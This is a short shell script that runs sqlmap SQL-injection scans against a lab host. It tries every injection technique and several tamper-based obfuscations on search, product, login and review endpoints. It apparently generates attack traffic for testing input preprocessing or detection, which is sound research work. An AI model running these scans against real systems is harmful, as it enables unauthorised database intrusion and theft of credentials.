#!/bin/sh
# Generates attack traffic against the lab target only (http://target:5000, internal network).
set -u
T=http://target:5000
COMMON="--batch --flush-session --disable-coloring --threads=4 --timeout=5 --time-sec=1 -v 0"
for TECH in B E U S T Q; do
  sqlmap -u "$T/search?q=kaos" -p q --dbms=SQLite --technique=$TECH --level=3 --risk=2 $COMMON
  sqlmap -u "$T/product?id=1" -p id --technique=$TECH --level=3 --risk=2 $COMMON
  sqlmap -u "$T/login" --data="email=a@b.c&password=x" -p email --technique=$TECH --level=3 --risk=2 $COMMON
  sqlmap -u "$T/review?comment=bagus" -p comment --technique=$TECH --level=3 --risk=2 $COMMON
done
# Tamper scripts produce obfuscated variants (encoding, comments, case) to test preprocessing.
for TAMPER in space2comment randomcase charencode between equaltolike; do
  sqlmap -u "$T/search?q=kaos" -p q --tamper=$TAMPER --level=3 --risk=2 $COMMON
done
echo "sqlmap finished"
